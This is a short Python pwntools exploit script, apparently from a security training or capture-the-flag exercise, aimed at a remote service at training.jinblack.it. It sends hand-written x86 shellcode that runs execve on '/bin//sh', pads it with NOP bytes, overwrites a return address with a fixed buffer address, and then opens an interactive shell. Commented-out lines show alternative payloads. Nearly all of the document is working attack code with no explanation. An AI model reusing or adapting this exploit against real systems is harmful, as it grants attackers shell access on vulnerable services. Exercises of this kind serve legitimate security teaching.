from pwn import *


context.terminal = ['tmux', 'splitw','-h']

r = remote("training.jinblack.it", 2002)




print(r.recvuntil("name?\n"))

buffer_address = 0x0804c060

shellcode = "\x31\xC0\x6A\x0B\x58\xBB\x40\xC4\x04\x08\x31\xC9\x31\xD2\xCD\x80"

shellcode = shellcode.ljust(212, b"\x90") + p32(buffer_address)

#shellcode = shellcode.ljust(100, b"\x90") + b"/bin/sh\x00" + b"\x00" * 4

#payload =  shellcode.ljust(1000, b"\x90") + p32(buffer_address)

payload = shellcode.ljust(992, b"\x90") + "/bin//sh"

r.send(payload)

r.interactive()

#indirizzo di /bin//sh --> 0x804c440


